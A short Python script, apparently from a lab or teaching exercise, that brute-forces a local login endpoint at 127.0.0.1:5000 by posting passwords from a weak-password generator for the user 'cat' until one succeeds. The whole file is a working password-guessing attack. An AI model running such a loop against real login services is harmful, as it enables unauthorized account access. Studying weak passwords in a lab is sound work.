import requests

from genpass import BadPasswordGenerator

generator = BadPasswordGenerator()

while True:
    try:
        password = generator.next()
        response = requests.post('http://127.0.0.1:5000/auth',
                                 json={'login': 'cat', 'password': password})
        if response.status_code == 200:
            print('SUCCESS', password)
            break
    except IndexError:
        print('Все пароли перебраны')
        break
